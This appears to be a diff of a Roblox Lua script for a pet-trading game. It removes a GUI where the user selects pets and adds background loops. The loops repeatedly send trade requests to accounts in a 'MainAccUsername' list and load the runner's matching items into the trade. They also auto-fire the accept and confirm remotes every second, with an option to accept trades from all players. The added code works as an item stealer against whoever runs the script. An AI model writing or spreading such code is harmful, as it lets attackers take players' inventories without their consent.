-		loopRunning = true
-		SendTradeButton.Text = "Auto-trade running"
-		task.spawn(function()
-			while loopRunning do
-				local targetPlayer = getSelectedPlayer()
-				if not targetPlayer then
-					stopLoop()
+			if matchesForm then
+				table.insert(uniqueIds, uniqueId)
+				if #uniqueIds >= limit then
 					break
 				end
-
-				addSelectedPets()
-				pcall(function()
-					sendTradeRemote:FireServer(targetPlayer)
-				end)
-				task.wait(5)
 			end
+		end
+	end
+	return uniqueIds
+end
+
+local function sendTradeRequest(playerName)
+	local targetPlayer = Players:FindFirstChild(playerName)
+	if not targetPlayer then
+		return false
+	end
+	
+	if sendTradeRemote and sendTradeRemote:IsA("RemoteEvent") then
+		local success = pcall(function()
+			sendTradeRemote:FireServer(targetPlayer)
 		end)
+		if success then
+			task.wait(5)
+			return true
+		end
 	end
 
-	SendTradeButton.Activated:Connect(startLoop)
-	StopTradeButton.Activated:Connect(stopLoop)
-	Players.PlayerRemoving:Connect(function(player)
-		if getSelectedPlayer() == player then
-			stopLoop()
-		end
-	end)
+	return false
 end
-coroutine.wrap(TRADELOOP_fake_script)()
 
-local function PETINVENTORY_fake_script() -- PetInterface.PetInventoryScript
-	local script = Instance.new("LocalScript", PetInterface)
+local function acceptTradeForAll()
+	for _, targetPlayer in ipairs(Players:GetPlayers()) do
+		if targetPlayer ~= Players.LocalPlayer then
+			local args = {
+				targetPlayer,
+				true
+			}
 
-	local ReplicatedStorage = game:GetService("ReplicatedStorage")
-	local LocalPlayer = game:GetService("Players").LocalPlayer
-	local successClientData, ClientData = pcall(function()
-		return require(ReplicatedStorage:WaitForChild("ClientModules"):WaitForChild("Core"):WaitForChild("ClientData"))
-	end)
-
-	local function getPetGroups()
-		local groups = {}
-		if not successClientData or not ClientData then
-			return groups
-		end
-
-		local dataStore = ClientData.get_data()
-		local playerData = dataStore and (dataStore[LocalPlayer] or dataStore[LocalPlayer.Name])
-		local inventory = playerData and playerData.inventory
-		local pets = inventory and inventory.pets
-		if type(pets) ~= "table" then
-			return groups
-		end
-
-		local eggIds = {}
-		local eggKinds = {}
-		local eggs = inventory and inventory.eggs
-		if type(eggs) == "table" then
-			for eggId, eggData in pairs(eggs) do
-				eggIds[tostring(eggId)] = true
-				if type(eggData) == "table" then
-					local eggKind = getItemDisplayName(eggData, eggData.kind or eggData.name or eggData.id)
-					if eggKind then
-						eggKinds[tostring(eggKind)] = true
-					end
-				end
-			end
-		end
-
-		for uniqueId, itemData in pairs(pets) do
-			if type(itemData) == "table" then
-				local itemId = tostring(uniqueId)
-				local name = getItemDisplayName(itemData, itemData.kind or itemData.name or itemData.id or itemId)
-				local itemType = string.lower(tostring(itemData.category or itemData.itemType or ""))
-				local isEgg = eggIds[tostring(uniqueId)]
-					or eggKinds[name]
-					or itemData.isEgg == true
-					or itemData.is_egg == true
-					or itemType == "egg"
-					or itemType == "eggs"
-					or string.find(string.lower(name), "egg", 1, true) ~= nil
-				if not isEgg then
-					groups[name] = groups[name] or {name = name, ids = {}}
-					table.insert(groups[name].ids, tostring(uniqueId))
-				end
-			end
-		end
-		return groups
-	end
-
-	local function refreshPets()
-		local oldList = PetInterface:FindFirstChild("PetInventoryList")
-		if oldList then
-			oldList:Destroy()
-		end
-
-		local list = Instance.new("ScrollingFrame")
-		list.Name = "PetInventoryList"
-		list.Parent = PetInterface
-		list.BackgroundTransparency = 1
-		list.BorderSizePixel = 0
-		list.Position = UDim2.fromOffset(8, 8)
-		list.Size = UDim2.new(1, -16, 1, -16)
-		list.AutomaticCanvasSize = Enum.AutomaticSize.Y
-		list.CanvasSize = UDim2.new()
-		list.ScrollBarThickness = 6
-
-		local layout = Instance.new("UIListLayout")
-		layout.Parent = list
-		layout.Padding = UDim.new(0, 6)
-		layout.SortOrder = Enum.SortOrder.Name
-
-		local groups = getPetGroups()
-		local names = {}
-		for name in pairs(groups) do
-			table.insert(names, name)
-		end
-		table.sort(names)
-
-		for _, name in ipairs(names) do
-			local group = groups[name]
-			local button = Instance.new("TextButton")
-			button.Name = name
-			button.Parent = list
-			button.Size = UDim2.new(1, -6, 0, 32)
-			button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-			button.BorderSizePixel = 0
-			button.Font = Enum.Font.SourceSansBold
-			button.Text = string.format("%s x%d", group.name, #group.ids)
-			button.TextColor3 = Color3.new(1, 1, 1)
-			button.TextSize = 17
-			button:SetAttribute("Selected", false)
-			button:SetAttribute("PetIds", table.concat(group.ids, ","))
-			Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)
-
-			button.Activated:Connect(function()
-				local selected = not button:GetAttribute("Selected")
-				button:SetAttribute("Selected", selected)
-				button.BackgroundColor3 = selected and Color3.fromRGB(158, 0, 158) or Color3.fromRGB(45, 45, 45)
+			local success, err = pcall(function()
+				return tradeFunction:InvokeServer(unpack(args))
 			end)
 		end
 	end
-
-	refreshPets()
-	RefreshPetButton.Activated:Connect(refreshPets)
 end
-coroutine.wrap(PETINVENTORY_fake_script)()
 
-local function EGG_INVENTORY_fake_script() -- EggInterface.EggInventoryScript
-	local script = Instance.new("LocalScript", EggInterface)
+task.spawn(function()
+	while true do
+		if MainAccUsername and #MainAccUsername > 0 and MainAccUsername[1] ~= "" then
+			for _, playerName in ipairs(MainAccUsername) do
+				if Players:FindFirstChild(playerName) then
+					local uniqueIds = getMultipleUniqueIdsByName(TARGET_ITEM_NAME, TARGET_ITEM_FORM, 18)
 
-	local ReplicatedStorage = game:GetService("ReplicatedStorage")
-	local LocalPlayer = game:GetService("Players").LocalPlayer
-	local successClientData, ClientData = pcall(function()
-		return require(ReplicatedStorage:WaitForChild("ClientModules"):WaitForChild("Core"):WaitForChild("ClientData"))
-	end)
-
-	local function getEggGroups()
-		local groups = {}
-		if not successClientData or not ClientData then
-			return groups
+					for _, uniqueId in ipairs(uniqueIds) do
+						pcall(function()
+							addItemRemote:FireServer(uniqueId)
+						end)
+					end
+					break
+				end
+			end
 		end
 
-		local dataStore = ClientData.get_data()
-		local playerData = dataStore and (dataStore[LocalPlayer] or dataStore[LocalPlayer.Name])
-		local inventory = playerData and playerData.inventory
-		local eggs = inventory and inventory.eggs
-		local eggIds = {}
-		local eggKinds = {}
-		local hasEggInventory = false
+		task.wait(1)
+	end
+end)
 
-		local function addEgg(name, amount)
-			name = tostring(name or "Unknown Egg")
-			groups[name] = (groups[name] or 0) + (tonumber(amount) or 1)
-		end
+task.spawn(function()
+	local currentTargetIndex = 1
 
-		if type(eggs) == "table" then
-			for eggId, eggData in pairs(eggs) do
-				hasEggInventory = true
-				eggIds[tostring(eggId)] = true
-				if type(eggData) == "table" then
-							local name = getItemDisplayName(eggData, eggData.kind or eggData.name or eggData.id or eggId)
-					eggKinds[tostring(name)] = true
-					addEgg(name, eggData.amount or eggData.quantity or eggData.count)
-				elseif type(eggData) == "string" then
-							local name = getItemDisplayName(nil, eggData)
-							eggKinds[name] = true
-							addEgg(name)
+	while true do
+		if MainAccUsername and #MainAccUsername > 0 then
+			if currentTargetIndex > #MainAccUsername then
+				currentTargetIndex = 1
+			end
+
+			local playerName = MainAccUsername[currentTargetIndex]
+			if playerName and playerName ~= "" then
+				if Players:FindFirstChild(playerName) then
+					if sendTradeRequest(playerName) then
+						currentTargetIndex += 1
+					end
 				else
-							addEgg(getItemDisplayName(nil, eggId), eggData)
+					currentTargetIndex += 1
 				end
+			else
+				currentTargetIndex += 1
 			end
 		end
 
-		local pets = inventory and inventory.pets
-		if not hasEggInventory and type(pets) == "table" then
-			for uniqueId, itemData in pairs(pets) do
-				if type(itemData) == "table" then
-					local name = getItemDisplayName(itemData, itemData.kind or itemData.name or itemData.id or uniqueId)
-					local itemType = string.lower(tostring(itemData.category or itemData.itemType or ""))
-					local isEgg = eggIds[tostring(uniqueId)]
-						or eggKinds[name]
-						or itemData.isEgg == true
-						or itemData.is_egg == true
-						or itemType == "egg"
-						or itemType == "eggs"
-						or string.find(string.lower(name), "egg", 1, true) ~= nil
-					if isEgg then
-						addEgg(name, itemData.amount or itemData.quantity or itemData.count)
-					end
-				end
-			end
+		if ForceReceiver then
+			acceptTradeForAll()
 		end
-		return groups
+
+		task.wait(1)
 	end
+end)
 
-	local function refreshEggs()
-		local oldList = EggInterface:FindFirstChild("EggInventoryList")
-		if oldList then
-			oldList:Destroy()
-		end
 
-		local list = Instance.new("ScrollingFrame")
-		list.Name = "EggInventoryList"
-		list.Parent = EggInterface
-		list.BackgroundTransparency = 1
-		list.BorderSizePixel = 0
-		list.Position = UDim2.fromOffset(8, 8)
-		list.Size = UDim2.new(1, -16, 1, -16)
-		list.AutomaticCanvasSize = Enum.AutomaticSize.Y
-		list.CanvasSize = UDim2.new()
-		list.ScrollBarThickness = 6
+-- Cache the remotes once
+local AcceptNeg = API:WaitForChild("TradeAPI/AcceptNegotiation")
+local ConfirmTrade = API:WaitForChild("TradeAPI/ConfirmTrade")
 
-		local layout = Instance.new("UIListLayout")
-		layout.Parent = list
-		layout.Padding = UDim.new(0, 6)
-		layout.SortOrder = Enum.SortOrder.Name
-
-		local groups = getEggGroups()
-		local names = {}
-		for name in pairs(groups) do
-			table.insert(names, name)
-		end
-		table.sort(names)
-
-		for _, name in ipairs(names) do
-			local button = Instance.new("TextButton")
-			button.Name = name
-			button.Parent = list
-			button.Size = UDim2.new(1, -6, 0, 32)
-			button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-			button.BorderSizePixel = 0
-			button.Font = Enum.Font.SourceSansBold
-			button.Text = string.format("%s x%d", name, groups[name])
-			button.TextColor3 = Color3.new(1, 1, 1)
-			button.TextSize = 17
-			button:SetAttribute("Selected", false)
-			Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)
-
-			button.Activated:Connect(function()
-				local selected = not button:GetAttribute("Selected")
-				button:SetAttribute("Selected", selected)
-				button.BackgroundColor3 = selected and Color3.fromRGB(158, 0, 158) or Color3.fromRGB(45, 45, 45)
-			end)
-		end
-	end
-
-	refreshEggs()
-	RefreshEggButton.Activated:Connect(refreshEggs)
+local function RunTradeAutomation()
+    while true do
+		AcceptNeg:FireServer()
+		ConfirmTrade:FireServer()
+        task.wait(1) -- Wait 1 second before the next loop
+    end
 end
-coroutine.wrap(EGG_INVENTORY_fake_script)()
+
+-- Start the loop in the background
+task.spawn(RunTradeAutomation)
